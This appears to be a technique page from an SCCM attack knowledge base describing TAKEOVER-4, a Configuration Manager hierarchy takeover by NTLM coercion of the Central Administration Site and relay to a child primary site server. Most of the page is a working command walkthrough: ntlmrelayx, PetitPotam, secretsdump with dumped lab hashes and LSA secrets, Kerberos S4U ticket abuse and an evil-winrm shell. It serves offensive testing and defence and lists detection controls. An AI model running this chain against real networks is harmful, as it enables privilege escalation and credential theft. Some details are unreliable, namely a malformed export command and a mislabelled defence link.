# TAKEOVER-4

## Description
Hierarchy takeover via NTLM coercion and relay from CAS to origin primary site server

## MITRE ATT&CK TTPs
- [TA0004](https://attack.mitre.org/tactics/TA0004) - Privilege Escalation
- [TA0008](https://attack.mitre.org/tactics/TA0008) - Lateral Movement

## Requirements
### Coercion
- Valid Active Directory domain credentials
- Connectivity to SMB (TCP/445) on coercion target:
- Connectivity from the coercion target to SMB (TCP/445) on the relay server
- Coercion target settings:
    - `BlockNTLM` = `0` or not present, or = `1` and `BlockNTLMServerExceptionList` contains attacker relay server
    - `RestrictSendingNTLMTraffic` = `0`, `1`, or not present, or = `2` and `ClientAllowedNTLMServers` contains attacker relay server
    - Domain computer account is not in `Protected Users`
- Domain controller settings:
    - `RestrictNTLMInDomain` = `0` or not present, or is configured with any value and `DCAllowedNTLMServers` contains coercion target
    - `LmCompatibilityLevel` < `5` or not present, or = `5` and LmCompatibilityLevel >= `3` on the coercion target

### Relay
- Connectivity from the relay server to SMB (TCP/445) on the relay target, the child primary site
- Connectivity from the relay server to HTTPS (TCP/443) on the relay target, the child primary site
- Relay target settings:
    - `RequireSecuritySignature` = `0` or not present
    - `RestrictReceivingNTLMTraffic` = `0` or not present
    - Coercion target is local admin (to access RPC/admin shares)
- Domain controller settings:
    - `RestrictNTLMInDomain` = `0` or not present, or is configured with any value and `DCAllowedNTLMServers` contains relay target
   


## Summary
In some situations, such as reaching limits for [client enrollment](https://learn.microsoft.com/en-us/mem/configmgr/core/plan-design/configs/size-and-scale-numbers#bkmk_pri), SCCM adminsitrators may choose to expand from single site into a hierarchy mangaed by a Central Administration Site (CAS). A prerequisite for expansion is for the CAS's host server machine account to be a [local administrator](https://learn.microsoft.com/en-us/mem/configmgr/core/servers/deploy/install/prerequisites-for-installing-sites#computer-account-as-administrator) on the originating primary site server. This permission is only required during expansion of the site and can be removed when complete. Additionally, this permission is not required for any further sites joined to the hierarchy once complete. However, if a configuration exists where all site server hosts are a member of a security group that grants local administrator rights to each other, the CAS can be coerced and relayed to *any* child site.

An attacker who is able to successfully coerce NTLM authentication from a CAS via SMB can escalate to "Full Administrator" by either: 
1. Relaying the CAS to SMB on its originating child primary site
2. Relaying the CAS to the AdminService on its originating child primary site

## Impact

The "Full Administrator" security role is granted all permissions in Configuration Manager for all scopes and all collections. An attacker with this privilege can execute arbitrary programs on any client device that is online as SYSTEM, the currently logged on user, or as a specific user when they next log on. They can also leverage tools such as CMPivot and Run Script to query or execute scripts on client devices in real-time using the AdminService or WMI on an SMS Provider.

## Subtechniques
- TAKEOVER-4.1: Relay to SMB
- TAKEOVER-4.2: Relay to AdminService

## Defensive IDs
- [PREVENT-12: Require SMB signing on site systems](../../../defense-techniques/PREVENT/PREVENT-2/prevent-2_description.md)
- [DETECT-1: Monitor site system computer accounts authenticating from a source that is not its static IP](../../../defense-techniques/DETECT/DETECT-1/detect-1_description.md)
- [DETECT-4: Monitor group membership changes for SMS Admins](../../../defense-techniques/DETECT/DETECT-4/detect-4_description.md)

## Examples

### SMB relay

1. Use `SCCMHunter` to profile SCCM infrastructure

The results of the `smb` module indicate:
- The *CAS.INTERNAL.LAB* sytems is a site server in the "CAS" site and is also a Central Administration Site
- The *SCCM2.INTERNAL.LAB* host is a site server in the "ABC" site
- SMB signing is disabled on both systems
 

```
└─# python3 sccmhunter.py smb -u 'lowpriv' -p '<password>' -d <domain.name> -dc-ip 10.10.100.100
SCCMHunter v1.0.0 by @garrfoster
[16:23:53] INFO     Profiling 2 site servers.
[16:23:53] INFO     [+] Finished profiling Site Servers.
[16:23:53] INFO     +----------------------+------------+-------+-----------------+--------------+---------------+----------+---------+
                    | Hostname             | SiteCode   | CAS   | SigningStatus   | SiteServer   | SMSProvider   | Config   | MSSQL   |
                    +======================+============+=======+=================+==============+===============+==========+=========+
                    | cas.internal.lab     | CAS        | True  | False           | True         | True          | Active   | True    |
                    +----------------------+------------+-------+-----------------+--------------+---------------+----------+---------+
                    | sccm2.internal.lab   | ABC        | False | False           | True         | True          | Active   | True    |
                    +----------------------+------------+-------+-----------------+--------------+---------------+----------+---------+
```

2. On the attacker relay server, start `ntlmrelayx`, targeting the SMB service on the primary site server identified in the previous step.  The `-socks` flag is used to hold the authenticated session open

```
└─# python3 ntlmrelayx.py -t smb://TARGET_SITE_SERVER -smb2support -socks
Impacket v0.10.1.dev1+20230802.213755.1cebdf31 - Copyright 2022 Fortra

[*] Protocol Client SMB loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Running in relay mode to single host
[*] SOCKS proxy started. Listening at port 1080
[*] IMAPS Socks Plugin loaded..
[*] MSSQL Socks Plugin loaded..
[*] HTTP Socks Plugin loaded..
[*] HTTPS Socks Plugin loaded..
[*] SMB Socks Plugin loaded..
[*] IMAP Socks Plugin loaded..
[*] SMTP Socks Plugin loaded..
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
 * Serving Flask app 'impacket.examples.ntlmrelayx.servers.socksserver'
 * Debug mode: off
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections

```

3. From the attacker host, coerce NTLM authentication from the CAS via SMB, targeting the relay server's IP address:

```
┌──(root㉿DEKSTOP-2QO0YEUW)-[/opt/PetitPotam]
└─# python3 PetitPotam.py -u lowpriv -p P@ssw0rd <NTLMRELAYX_LISTENER_IP> <CAS_SITE_SERVER_IP> 

Trying pipe lsarpc
[-] Connecting to ncacn_np:passive.internal.lab[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!

```

After a few seconds, you should receive an SMB connection on the relay server that is forwarded to the SMB service on the site server and the authenticated session is held open

```
[*] Setting up RAW Server on port 6666
[*] Servers started, waiting for connections
Type help for list of commands
ntlmrelayx> [*] SMBD-Thread-9 (process_request_thread): Received connection from 10.10.100.23, attacking target smb://10.10.100.22
[*] Authenticating against smb://10.10.100.22 as LAB/CAS$ SUCCEED
[*] SOCKS: Adding LAB/CAS$@10.10.100.22(445) to active SOCKS connection. Enjoy
[*] SMBD-Thread-10 (process_request_thread): Connection from 10.10.100.23 controlled, but there are no more targets left!
socks
Protocol  Target        Username  AdminStatus  Port
--------  ------------  --------  -----------  ----
SMB       10.10.100.22  LAB/CAS$  TRUE         445
ntlmrelayx>
```

 4. Proxy `secretsdump.py` in the context of the CAS through the authenticated session to recover the primary site server's hashed credential

```
└─# proxychains secretsdump.py 'lab/cas$@10.10.100.22' -no-pass
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
Impacket v0.12.0.dev1+20240130.154745.97007e84 - Copyright 2023 Fortra

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.100.22:445  ...  OK
[*] Target system bootKey: 0x591d0e9f4a35be400e905f0a738f3293
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:c566fb8d8483e6965f3b84bfce924e68:::
[*] Dumping cached domain logon information (domain/username:hash)
INTERNAL.LAB/Administrator:$DCC2$10240#Administrator#dfb35a65f92d8af602f08e358a58dc42: (2024-02-04 02:22:11)
INTERNAL.LAB/sqlsvc:$DCC2$10240#sqlsvc#e12866f9a8777ddbe39ae1380ac6346c: (2024-02-03 07:49:42)
INTERNAL.LAB/Administrator:$DCC2$10240#Administrator#dfb35a65f92d8af602f08e358a58dc42: (2024-02-04 03:52:56)
INTERNAL.LAB/Administrator:$DCC2$10240#Administrator#dfb35a65f92d8af602f08e358a58dc42: (2024-02-04 04:07:52)
INTERNAL.LAB/Administrator:$DCC2$10240#Administrator#dfb35a65f92d8af602f08e358a58dc42: (2024-03-05 21:42:14)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
LAB\SCCM2$:aes256-cts-hmac-sha1-96:c9d883ed8440db8e0d93f304515d30a1ff6e888bad955852de479c0315717244
LAB\SCCM2$:aes128-cts-hmac-sha1-96:aabcd69243a242d257672af66c042866
LAB\SCCM2$:des-cbc-md5:d65d37231697ea34
LAB\SCCM2$:plain_password_hex:0ccdb44e2241dea6ba1082fa4633eec08d86b943e9f7e6fed95165da6f3c3e9ed4d1b89b498a680fb90470bae441e68e72ae3b0b38b434f9516765d369a7d0d720307bf92d7c578655663f8aa9dc9a21168cbf51f5220b7962ce1f472b764a4e998b68f7af8cfa4206cf8b6367da9738ff0387d149febc6be6a3b98b4a9065011770a479e114dd9cd31da1ec47bb3299afb51b00b7cf40d2c98b415cd86b914cdb5cde6b5a38ee42ad395f53bd3c1cb98d246199d3513ad3003e3117fef88d3c7dd177e0af4d3ff89621f5e4ec36c84b18ee2a8d12aa2372622cd7b0e726adf273ab167b29a432b5100da5f7beeafbdc
LAB\SCCM2$:aad3b435b51404eeaad3b435b51404ee:2e510487c6db715d8f0c5bea67d9e27d:::
[*] DPAPI_SYSTEM
dpapi_machinekey:0x7848d7d7769ac8bc4079e9958d33f241f5b3a745
dpapi_userkey:0x23789fd52652665f635839e916568e8d5fd2796b
[*] NL$KM
 0000   9D DD 9E 8D BC 07 08 85  00 B7 A8 EB 0E A0 5C E2   ..............\.
 0010   76 73 18 C4 74 EC BB 59  37 B1 95 56 2E 1B 33 85   vs..t..Y7..V..3.
 0020   13 26 52 8B D9 28 48 47  78 2A C3 97 71 2B E5 A6   .&R..(HGx*..q+..
 0030   CE 6E F9 90 1F 04 2A 2A  DC 8F 73 E4 1D 30 97 72   .n....**..s..0.r
NL$KM:9ddd9e8dbc07088500b7a8eb0ea05ce2767318c474ecbb5937b195562e1b33851326528bd9284847782ac397712be5a6ce6ef9901f042a2adc8f73e41d309772
[*] Cleaning up...
```


 5. Get TGT for recovered site server machine account

 ```
 └─# getTGT.py internal.lab/SCCM2$ -hashes aad3b435b51404eeaad3b435b51404ee:2e510487c6db715d8f0c5bea67d9e27d
Impacket v0.12.0.dev1+20240130.154745.97007e84 - Copyright 2023 Fortra

[*] Saving ticket in SCCM2$.ccache
```

6. S4U

```
┌──(root㉿DEKSTOP-2QO0YEUW)-[/opt/PKINITtools]
└─# python3 gets4uticket.py kerberos+ccache://internal.lab\\sccm\$:SCCM2\$.ccache@dc01.internal.lab http/sccm2.internal.lab@internal.lab cas\$@internal.lab cas_s4u.ccache -v
2024-03-06 21:59:36,769 minikerberos INFO     Trying to get SPN with cas$@internal.lab for http/sccm2.internal.lab@internal.lab
INFO:minikerberos:Trying to get SPN with cas$@internal.lab for http/sccm2.internal.lab@internal.lab
2024-03-06 21:59:36,774 minikerberos INFO     Success!
INFO:minikerberos:Success!
2024-03-06 21:59:36,774 minikerberos INFO     Done!
INFO:minikerberos:Done!

```
7. Set the Kerberos credentials cache file environment variable

```
export cas_s4u.ccache


└─# klist
Ticket cache: FILE:cas_s4u.ccache
Default principal: SCCM2$@INTERNAL.LAB

Valid starting       Expires              Service principal
03/06/2024 18:02:50  03/07/2024 04:02:50  krbtgt/INTERNAL.LAB@INTERNAL.LAB
    renew until 03/07/2024 18:02:50
03/06/2024 21:59:36  03/07/2024 04:02:50  http/sccm2.internal.lab@INTERNAL.LAB
    for client cas$@internal.lab
03/06/2024 21:59:36  03/07/2024 04:02:50  http/sccm2.internal.lab@INTERNAL.LAB
    for client cas$@internal.lab

```

8. Establish a PowerShell remoting session on the target site server to interact with the SMS Provider

```
└─# evil-winrm -r internal.lab -i sccm2.internal.lab

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\SCCM2$\Documents> get-ciminstance -ClassName SMS_Admin -Namespace root\sms\site_ABC


AccountType       : 0
AdminID           : 16777217
AdminSid          : S-1-5-21-4004054868-2969153893-1580793631-500
Categories        :
CategoryNames     : {All}
CollectionNames   : {All Systems, All Users and User Groups}
CreatedBy         : LAB\Administrator
CreatedDate       : 2/2/2024 11:56:51 PM
DisplayName       :
DistinguishedName :
ExtendedData      :
IsCovered         :
IsDeleted         : False
IsGroup           : False
LastModifiedBy    : LAB\Administrator
LastModifiedDate  : 2/2/2024 11:56:51 PM
LogonName         : LAB\Administrator
Permissions       :
RoleNames         : {Full Administrator}
Roles             :
SKey              : ABCS-1-5-21-4004054868-2969153893-1580793631-500
SourceSite        : ABC
PSComputerName    :
```




## References
Microsoft, Prerequisites for installing Configuration Manager sites, https://learn.microsoft.com/en-us/mem/configmgr/core/servers/deploy/install/prerequisites-for-installing-sites#bkmk_expand